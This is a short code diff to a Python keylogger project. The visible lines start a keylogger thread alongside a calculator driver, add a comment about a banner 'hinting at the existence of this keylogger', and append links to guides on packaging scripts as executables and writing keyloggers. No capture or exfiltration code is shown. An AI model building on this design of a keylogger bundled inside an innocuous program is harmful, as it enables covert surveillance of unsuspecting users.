@@ -113,6 +113,7 @@ class Keylogger:
         except Exception as e:
             print(e)    
         finally:
+            # a very obvious message hinting at the existence of this keylogger...
             print(r"""
    ('-.  _   .-')      ('-.                               .-')      ('-.       .-') _  .-') _   ,---. 
  _(  OO)( '.( OO )_   ( OO ).-.                          ( OO ).  _(  OO)     ( OO ) )(  OO) )  |   | 
@@ -169,3 +170,11 @@ if __name__ == '__main__':
     # use threading to begin the two tasks
     Thread(target=calc.driver).start()
     Thread(target=my_logger.start).start()
+
+# guides used:
+# https://www.geeksforgeeks.org/convert-python-script-to-exe-file/
+# https://pyinstaller.readthedocs.io/en/stable/usage.html
+# https://github.com/boppreh/keyboard#api
+# https://www.youtube.com/watch?v=9WPmxH4RRZ0
+# https://www.youtube.com/watch?v=UZX5kH72Yx4
+# https://www.thepythoncode.com/article/write-a-keylogger-python
